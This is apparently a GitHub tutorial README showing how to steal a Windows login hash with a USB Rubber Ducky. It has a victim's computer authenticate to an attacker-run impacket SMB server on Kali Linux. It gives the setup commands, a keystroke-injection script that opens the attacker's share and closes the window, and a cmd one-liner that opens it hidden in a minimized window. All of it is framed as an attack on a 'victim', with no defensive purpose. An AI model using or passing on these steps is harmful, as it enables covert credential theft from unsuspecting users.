IN this tutorial you will learn how to grab the log in hash in seconds uning rubber ducky.

- https://github.com/fortra/impacket

- git clone this repo 

- cd impacket

- cd examples

- ./smbserver.py

- ./smbserver.py tmp /tmp/

- now go the the vicitm's windows computer open RUN 

- now type //ipaddresofkalilinux 

- press ENTER 

-you will get access of the tmp directory you just created using smb server on windows & on kali linux you will get the ahsh authintication of the windows.



## now we can create a ducky script to grab the hash 

### script

GUI r
STRING \\kalilinuxip
ENTER
ALT + F4
 

## we can also use cmd for the same 

- open run

- cmd /C "start /MIN explorer \\kalilinuxipaddress"  
(here /C - will close cmd after completing the command)
(/MIN explorer - will open the explorer in minimized window)
(/kalilinuxipadress - ip of our smb server )








____________________________________________________________________________________________________________________________________________
▶ Name: StromWise

▶ Role: Creator

▶ Location: Unknown

▶ GitHub: https://github.com/stromwise 

▶ Instagram: https://www.instagram.com/stromwise/ 

▶ Facebook: https://www.facebook.com/profile.php?id=100093706328777

▶ Youtube: https://www.youtube.com/channel/UC-tafc0TqgZNnQio8Gj-hjg 

▶ Twitter: https://twitter.com/StromWise 
____________________________________________________________________________________________________________________________________________

